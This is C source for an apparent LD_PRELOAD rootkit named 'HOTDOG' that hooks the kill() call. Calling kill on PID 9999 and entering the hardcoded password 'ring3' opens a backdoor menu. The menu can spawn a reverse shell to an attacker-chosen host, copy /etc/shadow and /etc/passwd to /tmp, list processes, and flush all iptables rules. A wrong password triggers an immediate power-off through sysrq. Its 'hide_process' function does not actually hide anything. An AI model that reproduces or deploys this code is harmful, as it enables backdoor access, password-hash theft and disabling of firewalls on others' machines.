#include <stdio.h>
#include <signal.h>
#include <dlfcn.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <fcntl.h>

#define GREEN "\x1b[32m"
#define RESET "\x1b[0m"

#ifndef RTLD_NEXT
#define RTLD_NEXT ((void *) -1)
#endif

void hide_process(pid_t pid) {
    char path[256];
    snprintf(path, sizeof(path), "/proc/%d/oom_score_adj", pid);
    int fd = open(path, O_WRONLY);
    if (fd != -1) {
        write(fd, "0", 1);
        close(fd);
    } else {
        perror("open");
    }
}

int kill(pid_t pid, int sig) {
    const int pids = 9999;
    int (*r4id)(pid_t, int);
    r4id = dlsym(RTLD_NEXT, "kill");

    if (pid == pids) {
        char password[20];
        char *pass = "ring3";

        write(1, "[+] Password \n", strlen("[+] Password \n"));
        write(1, "[!] --> ", strlen("[!] --> "));
        scanf("%19s", password);

        if (strcmp(password, pass) == 0) {
            int escolha;

            printf(GREEN" _    _   ___  _______  _____    ___    _____  _ \n");
            printf("| |  | | / _ \\|__   __||  __ \\  / _ \\  / ____|| |\n");
            printf("| |__| || | | |  | |   | |  | || | | || |  __ | |\n");
            printf("|  __  || | | |  | |   | |  | || | | || | |_ || |\n");
            printf("| |  | || |_| |  | |   | |__| || |_| || |__| ||_|\n");
            printf("|_|  |_| \\___/   |_|   |_____/  \\___/  \\_____|(_)\n");
            printf("\n" RESET);
            printf(GREEN"               By R4idB0y \n" RESET);
            printf(GREEN"               Version 0.2 \n" RESET);
            printf(GREEN"1) Reverse Shell \n" RESET);
            printf(GREEN"2) Dump Hashes and Passwords \n" RESET);
            printf(GREEN"3) List Running Process \n" RESET);
            printf(GREEN"4) Disable IPTables \n" RESET);
            printf(GREEN"=> " RESET);
            scanf("%d", &escolha);

            switch (escolha) {
                case 1: {
                    int port;
                    char ip[16];

                    printf(GREEN"[+] SET YOUR LHOST => " RESET);
                    scanf("%15s", ip);

                    printf(GREEN"[+] SET YOUR LPORT => " RESET);
                    scanf("%d", &port);

                    printf(GREEN"[+] RECEIVED REVERSE SHELL => %s:%d \n" RESET, ip, port);

                    if (fork() == 0) {
                        struct sockaddr_in revsockaddr;
                        int sockt = socket(AF_INET, SOCK_STREAM, 0);
                        revsockaddr.sin_family = AF_INET;
                        revsockaddr.sin_port = htons(port);
                        revsockaddr.sin_addr.s_addr = inet_addr(ip);

                        connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));
                        dup2(sockt, 0);
                        dup2(sockt, 1);
                        dup2(sockt, 2);

                        char * const argv[] = {"sh", NULL};
                        execvp("sh", argv);
                    }

                    wait(NULL);
                    break;
                }

                case 2: {
                    int shadow_fd = open("/etc/shadow", O_RDONLY);
                    int passwd_fd = open("/etc/passwd", O_RDONLY);
                    int shadow_out_fd = open("/tmp/shadow_dump", O_WRONLY | O_CREAT, 0600);
                    int passwd_out_fd = open("/tmp/passwd_dump", O_WRONLY | O_CREAT, 0600);

                    if (shadow_fd != -1 && shadow_out_fd != -1) {
                        char buffer[1024];
                        ssize_t bytes;
                        while ((bytes = read(shadow_fd, buffer, sizeof(buffer))) > 0) {
                            write(shadow_out_fd, buffer, bytes);
                        }
                        close(shadow_fd);
                        close(shadow_out_fd);
                    } else {
                        perror("shadow");
                    }

                    if (passwd_fd != -1 && passwd_out_fd != -1) {
                        char buffer[1024];
                        ssize_t bytes;
                        while ((bytes = read(passwd_fd, buffer, sizeof(buffer))) > 0) {
                            write(passwd_out_fd, buffer, bytes);
                        }
                        close(passwd_fd);
                        close(passwd_out_fd);
                    } else {
                        perror("passwd");
                    }

                    printf(GREEN"[*] Password hashes dumped to /tmp/shadow_dump and /tmp/passwd_dump\n" RESET);
                    break;
                }

                case 3: {
                    printf(GREEN"[*] Listing running processes:\n" RESET);
                    DIR *proc = opendir("/proc");
                    struct dirent *entry;

                    if (proc == NULL) {
                        perror("opendir");
                        break;
                    }

                    while ((entry = readdir(proc)) != NULL) {
                        if (entry->d_type == DT_DIR) {
                            char *name = entry->d_name;
                            if (name[0] >= '0' && name[0] <= '9') {
                                printf("PID: %s\n", name);
                            }
                        }
                    }
                    closedir(proc);
                    break;
                }

                case 4: {
                    printf(GREEN "[*] Disabling all IPTables rules... [*]" RESET "\n");

                    system("iptables -F");
                    system("iptables -X");
                    system("iptables -t nat -F");
                    system("iptables -t nat -X");
                    system("iptables -t mangle -F");
                    system("iptables -t mangle -X");
                    system("iptables -t raw -F");
                    system("iptables -t raw -X");

                    printf(GREEN "[*] All IPTables rules disabled.\n" RESET);

                    break;
                }

                default:
                    printf("[!] Invalid option. Try again.\n");
                    break;
            }
        } else {
            int fd = open("/proc/sysrq-trigger", O_WRONLY);
            if (fd != -1) {
                write(fd, "o", 1);
                close(fd);
            } else {
                perror("open");
            }
        }
    } else {
        hide_process(getpid());
        return r4id(pid, sig);
    }

    return 0;
}
